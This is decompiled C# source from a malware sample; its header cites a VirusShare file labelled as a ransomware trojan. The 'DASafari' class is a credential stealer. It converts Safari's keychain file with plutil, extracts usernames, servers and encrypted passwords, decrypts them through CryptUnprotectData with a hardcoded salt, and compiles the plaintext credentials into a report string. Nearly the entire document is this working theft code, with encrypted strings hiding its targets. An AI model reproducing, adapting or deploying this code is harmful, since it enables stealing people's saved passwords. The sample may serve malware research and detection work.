// Decompiled with JetBrains decompiler
// Type: DASafari
// Assembly: Script Master v7, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C455AE42-10CE-458F-A8B3-AF5A9B9CC8DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eeafb61ec37b2a763da8693f22cd1ef63e43485408848c106d517b546e13c487.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

public class DASafari
{
  public class SFRIDL
  {
    public static byte[] salt = new byte[144]
    {
      (byte) 29,
      (byte) 172,
      (byte) 168,
      (byte) 248,
      (byte) 211,
      (byte) 184,
      (byte) 72,
      (byte) 62,
      (byte) 72,
      (byte) 125,
      (byte) 62,
      (byte) 10,
      (byte) 98,
      (byte) 7,
      (byte) 221,
      (byte) 38,
      (byte) 230,
      (byte) 103,
      (byte) 129,
      (byte) 3,
      (byte) 231,
      (byte) 178,
      (byte) 19,
      (byte) 165,
      (byte) 176,
      (byte) 121,
      (byte) 238,
      (byte) 79,
      (byte) 15,
      (byte) 65,
      (byte) 21,
      (byte) 237,
      (byte) 123,
      (byte) 20,
      (byte) 140,
      (byte) 229,
      (byte) 75,
      (byte) 70,
      (byte) 13,
      (byte) 193,
      (byte) 142,
      (byte) 254,
      (byte) 214,
      (byte) 231,
      (byte) 39,
      (byte) 117,
      (byte) 6,
      (byte) 139,
      (byte) 73,
      (byte) 0,
      (byte) 220,
      (byte) 15,
      (byte) 48,
      (byte) 160,
      (byte) 158,
      (byte) 253,
      (byte) 9,
      (byte) 133,
      (byte) 241,
      (byte) 200,
      (byte) 170,
      (byte) 117,
      (byte) 193,
      (byte) 8,
      (byte) 5,
      (byte) 121,
      (byte) 1,
      (byte) 226,
      (byte) 151,
      (byte) 216,
      (byte) 175,
      (byte) 128,
      (byte) 56,
      (byte) 96,
      (byte) 11,
      (byte) 113,
      (byte) 14,
      (byte) 104,
      (byte) 83,
      (byte) 119,
      (byte) 47,
      (byte) 15,
      (byte) 97,
      (byte) 246,
      (byte) 29,
      (byte) 142,
      (byte) 143,
      (byte) 92,
      (byte) 178,
      (byte) 61,
      (byte) 33,
      (byte) 116,
      (byte) 64,
      (byte) 75,
      (byte) 181,
      (byte) 6,
      (byte) 110,
      (byte) 171,
      (byte) 122,
      (byte) 189,
      (byte) 139,
      (byte) 169,
      (byte) 126,
      (byte) 50,
      (byte) 143,
      (byte) 110,
      (byte) 6,
      (byte) 36,
      (byte) 217,
      (byte) 41,
      (byte) 164,
      (byte) 165,
      (byte) 190,
      (byte) 38,
      (byte) 35,
      (byte) 253,
      (byte) 238,
      (byte) 241,
      (byte) 76,
      (byte) 15,
      (byte) 116,
      (byte) 94,
      (byte) 88,
      (byte) 251,
      (byte) 145,
      (byte) 116,
      (byte) 239,
      (byte) 145,
      (byte) 99,
      (byte) 111,
      (byte) 109,
      (byte) 46,
      (byte) 97,
      (byte) 112,
      (byte) 112,
      (byte) 108,
      (byte) 101,
      (byte) 46,
      (byte) 83,
      (byte) 97,
      (byte) 102,
      (byte) 97,
      (byte) 114,
      (byte) 105
    };
    [SpecialName]
    private static string[] \u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks;

    public static IntPtr LocalFree(IntPtr hMem)
    {
      IntPtr num;
      return num;
    }

    public static bool CryptUnprotectData(
      ref DASafari.SFRIDL.DATA_BLOG pDataIn,
      string szDataDescr,
      ref DASafari.SFRIDL.DATA_BLOG pOptionalEntropy,
      IntPtr pvReserved,
      ref IntPtr pPromptStruct,
      int dwFlags,
      ref DASafari.SFRIDL.DATA_BLOG pDataOut)
    {
      bool flag;
      return flag;
    }

    public static DASafari.SFRIDL.UserEntry[] STCHUSRENTR()
    {
      DASafari.SFRIDL.UserEntry[] userEntryArray;
      try
      {
        string plutil = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + GOSLWHR.WHJBIYT("dXeus6WIol+MoYWZsqJ5iaSrq5RapK+ynTl1r7akgpeguqGIol+ZrYmkrrisdaSru6yCoG2rsH4u", "False");
        string keychain = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("mJjS2cehd6XYyKzM1s7NmKfUzsGhycfXvqHKvtTAtbrKysSqhdLVxK/LDA==", "False");
        string fixedPath = (string) null;
        userEntryArray = DASafari.SFRIDL.CNVRTKYCHN(plutil, keychain, ref fixedPath) ? DASafari.SFRIDL.PRSEENTRS(fixedPath.Remove(checked (fixedPath.Length - 2))).ToArray() : (DASafari.SFRIDL.UserEntry[]) null;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return userEntryArray;
    }

    public static List<DASafari.SFRIDL.UserEntry> PRSEENTRS(string keychain)
    {
      string input = File.ReadAllText(keychain);
      List<DASafari.SFRIDL.UserEntry> userEntryList = new List<DASafari.SFRIDL.UserEntry>();
      try
      {
        int num = checked (DASafari.SFRIDL.InlineAssignHelper<string[]>(ref DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks, Regex.Split(Regex.Split(input, GOSLWHR.WHJBIYT("Wpq2vZ6Xdyo=", "False"))[1], GOSLWHR.WHJBIYT("XaCwsbRfJg==", "False"))).Length - 1);
        int index = 1;
        while (index <= num)
        {
          DASafari.SFRIDL.UserEntry userEntry = new DASafari.SFRIDL.UserEntry()
          {
            Username = DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("Y7XBxq+VqYsi", "False"), GOSLWHR.WHJBIYT("c4HQ2MigwMSiEw==", "False"), 0),
            AuthenticationType = int.Parse(DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("e8PT4MOmv9eqCw==", "False"), GOSLWHR.WHJBIYT("VmSpta1/nKW5dyw=", "False"), 0)),
            Comment = DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("Y7XBxq+VqYsi", "False"), GOSLWHR.WHJBIYT("c4HQ2MigwMSiEw==", "False"), 1),
            encPassword = DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("fsHJ48KABQ==", "False"), GOSLWHR.WHJBIYT("coDAxMmXjxI=", "False"), 0),
            Description = DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("Y7XBxq+VqYsi", "False"), GOSLWHR.WHJBIYT("c4HQ2MigwMSiEw==", "False"), 2),
            Label = DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("Y7XBxq+VqYsi", "False"), GOSLWHR.WHJBIYT("c4HQ2MigwMSiEw==", "False"), 3),
            Path = DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("Y7XBxq+VqYsi", "False"), GOSLWHR.WHJBIYT("c4HQ2MigwMSiEw==", "False"), 4),
            Port = int.Parse(DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("e8PT4MOmv9eqCw==", "False"), GOSLWHR.WHJBIYT("VmSpta1/nKW5dyw=", "False"), 1)),
            Protocol = int.Parse(DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("e8PT4MOmv9eqCw==", "False"), GOSLWHR.WHJBIYT("VmSpta1/nKW5dyw=", "False"), 2)),
            Server = DASafari.SFRIDL.GetBetween(DASafari.SFRIDL.\u0024STATIC\u0024PRSEENTRS\u00240115123511180BCE\u0024blocks[index], GOSLWHR.WHJBIYT("Y7XBxq+VqYsi", "False"), GOSLWHR.WHJBIYT("c4HQ2MigwMSiEw==", "False"), 5),
            UserIndex = checked (index - 1)
          };
          userEntry.decPassword = DASafari.SFRIDL.DECRYPTPSS(Convert.FromBase64String(userEntry.encPassword));
          userEntryList.Add(userEntry);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return userEntryList;
    }

    public void SAFRGT()
    {
      try
      {
        DASafari.SFRIDL.UserEntry[] userEntryArray1 = DASafari.SFRIDL.STCHUSRENTR();
        NTUIYURW.CEGKPHV = GOSLWHR.WHJBIYT("eZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUn6aYj7jIys2ld67YwqXF1aaYeZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUnw0=", "False");
        DASafari.SFRIDL.UserEntry[] userEntryArray2 = userEntryArray1;
        int index = 0;
        while (index < userEntryArray2.Length)
        {
          DASafari.SFRIDL.UserEntry userEntry = userEntryArray2[index];
          NTUIYURW.CEGKPHV = NTUIYURW.CEGKPHV + Environment.NewLine + GOSLWHR.WHJBIYT("icK/08GVvL+bcxI=", "False") + userEntry.Username;
          NTUIYURW.CEGKPHV = NTUIYURW.CEGKPHV + Environment.NewLine + GOSLWHR.WHJBIYT("aJSxuK6HpaJ/Vy4=", "False") + userEntry.decPassword + Environment.NewLine;
          checked { ++index; }
        }
        NTUIYURW.CEGKPHV = NTUIYURW.CEGKPHV + Environment.NewLine + GOSLWHR.WHJBIYT("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpAg=", "False");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string DECRYPTPSS(byte[] pwBuffer)
    {
      string str;
      try
      {
        object obj1 = (object) Marshal.AllocHGlobal(checked (pwBuffer.Length + 4));
        byte[] source = pwBuffer;
        object obj2 = obj1;
        IntPtr num1;
        IntPtr destination1 = obj2 != null ? (IntPtr) obj2 : num1;
        int length1 = pwBuffer.Length;
        Marshal.Copy(source, 0, destination1, length1);
        object obj3 = (object) Marshal.AllocHGlobal(DASafari.SFRIDL.salt.Length);
        byte[] salt = DASafari.SFRIDL.salt;
        object obj4 = obj3;
        IntPtr destination2 = obj4 != null ? (IntPtr) obj4 : num1;
        int length2 = DASafari.SFRIDL.salt.Length;
        Marshal.Copy(salt, 0, destination2, length2);
        DASafari.SFRIDL.DATA_BLOG dataBlog1;
        dataBlog1.cbData = pwBuffer.Length;
        ref DASafari.SFRIDL.DATA_BLOG local1 = ref dataBlog1;
        object obj5 = obj1;
        IntPtr num2 = obj5 != null ? (IntPtr) obj5 : num1;
        local1.pbData = num2;
        DASafari.SFRIDL.DATA_BLOG dataBlog2;
        dataBlog2.cbData = DASafari.SFRIDL.salt.Length;
        ref DASafari.SFRIDL.DATA_BLOG local2 = ref dataBlog2;
        object obj6 = obj3;
        IntPtr num3 = obj6 != null ? (IntPtr) obj6 : num1;
        local2.pbData = num3;
        ref DASafari.SFRIDL.DATA_BLOG local3 = ref dataBlog1;
        ref DASafari.SFRIDL.DATA_BLOG local4 = ref dataBlog2;
        IntPtr zero1 = IntPtr.Zero;
        IntPtr zero2 = IntPtr.Zero;
        ref IntPtr local5 = ref zero2;
        DASafari.SFRIDL.DATA_BLOG dataBlog3;
        ref DASafari.SFRIDL.DATA_BLOG local6 = ref dataBlog3;
        if (!DASafari.SFRIDL.CryptUnprotectData(ref local3, (string) null, ref local4, zero1, ref local5, 0, ref local6))
        {
          str = (string) null;
        }
        else
        {
          object obj7 = obj1;
          Marshal.FreeHGlobal(obj7 != null ? (IntPtr) obj7 : num1);
          object obj8 = obj3;
          Marshal.FreeHGlobal(obj8 != null ? (IntPtr) obj8 : num1);
          int length3 = Marshal.ReadInt32(dataBlog3.pbData);
          byte[] destination3 = new byte[checked (length3 + 1)];
          dataBlog3.pbData = new IntPtr(checked (dataBlog3.pbData.ToInt32() + 4));
          Marshal.Copy(dataBlog3.pbData, destination3, 0, length3);
          DASafari.SFRIDL.LocalFree(dataBlog3.pbData);
          char[] chArray = new char[checked (length3 - 1 + 1)];
          int num4 = checked (length3 - 1);
          int index = 0;
          while (index <= num4)
          {
            chArray[index] = Strings.ChrW((int) destination3[index]);
            checked { ++index; }
          }
          str = new string(chArray);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static bool CNVRTKYCHN(string plutil, string keychain, ref string fixedPath)
    {
      bool flag;
      try
      {
        fixedPath = (string) null;
        if (!File.Exists(plutil))
        {
          flag = false;
        }
        else
        {
          Process process = new Process();
          process.StartInfo.FileName = plutil;
          process.StartInfo.Arguments = " -convert xml1 -s -o \"" + DASafari.SFRIDL.InlineAssignHelper<string>(ref fixedPath, Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\fixed_keychain.xml\" ") + "\"" + keychain + "\"";
          process.StartInfo.CreateNoWindow = true;
          process.StartInfo.RedirectStandardOutput = true;
          process.StartInfo.UseShellExecute = false;
          process.Start();
          process.WaitForExit();
          flag = process.StandardOutput.ReadToEnd().Length == 0;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static string GetBetween(string input, string str1, string str2, int index)
    {
      string between;
      try
      {
        between = Regex.Split(Regex.Split(input, str1)[checked (index + 1)], str2)[0];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return between;
    }

    public static T InlineAssignHelper<T>(ref T target, T value)
    {
      T obj;
      try
      {
        target = value;
        obj = value;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public struct DATA_BLOG
    {
      public int cbData;
      public IntPtr pbData;
    }

    public struct UserEntry
    {
      public string Username;
      public string encPassword;
      public string decPassword;
      public string Description;
      public string Label;
      public string Path;
      public string Comment;
      public string Server;
      public int Protocol;
      public int AuthenticationType;
      public int Port;
      public int UserIndex;
    }
  }
}
